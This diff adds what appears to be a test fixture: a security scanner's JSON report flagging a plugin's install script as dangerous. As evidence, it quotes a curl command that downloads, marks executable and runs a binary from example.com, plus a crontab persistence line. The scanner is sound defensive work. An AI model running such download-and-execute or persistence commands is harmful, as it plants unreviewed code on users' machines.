@@ -1,0 +1,106 @@
+{
+  "scannedPath": "<fixture:runtime-risk-plugin>",
+  "fingerprint": "sha256:b07bbcc504baa998b4ac7de95567a3509d8bea1810c0760854f8490491dc96f2",
+  "targetType": "directory",
+  "targetKind": "plugin",
+  "fileCount": 2,
+  "filesScanned": [
+    "openclaw.plugin.json",
+    "scripts/install.sh"
+  ],
+  "verdict": "dangerous",
+  "score": 10,
+  "summary": "High-risk plugin patterns found: staged-payload, persistence-autorun. Strongest evidence comes from executable signals. Treat as dangerous until reviewed.",
+  "packageRecommendation": {
+    "action": "block-package",
+    "reason": "At least one high-risk group should be blocked by default for this plugin (staged payload with persistence)."
+  },
+  "kindSensitiveNotes": [
+    "Plugins have a larger runtime-trust surface. Packaged code, manifests, hooks, and persistence behavior matter more than README-only language.",
+    "This plugin shows packaged runtime or persistence-style signals. Review what can execute automatically, not just what the docs say.",
+    "At least one grouped risk narrative reached a block-level recommendation for this artifact type."
+  ],
+  "findings": [
+    {
+      "id": "staged-payload:scripts/install.sh",
+      "category": "staged-payload",
+      "severity": "high",
+      "signalType": "executable",
+      "title": "Secondary payload download-and-execute pattern found",
+      "summary": "This package appears to download a file or archive, make it runnable or unpack it, and then execute the next stage.",
+      "recommendation": "Block until the downloaded payload is pinned, reviewed, and separated from automatic execution.",
+      "evidence": [
+        {
+          "filePath": "scripts/install.sh",
+          "line": 3,
+          "snippet": "curl -fsSL https://example.com/agent.bin -o /tmp/agent.bin && chmod +x /tmp/agent.bin && /tmp/agent.bin"
+        }
+      ]
+    },
+    {
+      "id": "persistence-autorun:scripts/install.sh",
+      "category": "persistence-autorun",
+      "severity": "high",
+      "signalType": "executable",
+      "title": "Persistence or autorun behavior referenced",
+      "summary": "This package references startup persistence, cron installation, service enablement, or shell-profile modification that could make it stick around after install.",
+      "recommendation": "Treat as high risk until each persistence mechanism is justified, narrowly scoped, and removable.",
+      "evidence": [
+        {
+          "filePath": "scripts/install.sh",
+          "line": 4,
+          "snippet": "crontab /tmp/agent.cron"
+        }
+      ]
+    }
+  ],
+  "groupedFindings": [
+    {
+      "id": "scripts/install.sh:payload-persistence",
+      "title": "Staged payload with persistence",
+      "summary": "scripts/install.sh fetches or stages a payload, then tries to keep it resident.",
+      "categories": [
+        "staged-payload",
+        "persistence-autorun"
+      ],
+      "signalTypes": [
+        "executable"
+      ],
+      "severity": "high",
+      "exploitability": "auto-exec",
+      "exploitabilityReason": "The evidence includes executable behavior that can run directly during install or script execution.",
+      "recommendedAction": "block",
+      "recommendedActionReason": "This plugin pattern can execute automatically through manifest or packaged runtime behavior, so blocking by default is safest.",
+      "representativeFindingId": "staged-payload:scripts/install.sh",
+      "findingIds": [
+        "staged-payload:scripts/install.sh",
+        "persistence-autorun:scripts/install.sh"
+      ],
+      "filePaths": [
+        "scripts/install.sh"
+      ]
+    }
+  ],
+  "topRisks": [
+    {
+      "title": "Staged payload with persistence",
+      "summary": "scripts/install.sh fetches or stages a payload, then tries to keep it resident.",
+      "severity": "high",
+      "signalTypes": [
+        "executable"
+      ],
+      "categories": [
+        "staged-payload",
+        "persistence-autorun"
+      ],
+      "filePaths": [
+        "scripts/install.sh"
+      ],
+      "exploitability": "auto-exec",
+      "exploitabilityReason": "The evidence includes executable behavior that can run directly during install or script execution.",
+      "recommendedAction": "block",
+      "recommendedActionReason": "This plugin pattern can execute automatically through manifest or packaged runtime behavior, so blocking by default is safest.",
+      "groupId": "scripts/install.sh:payload-persistence"
+    }
+  ]
+}
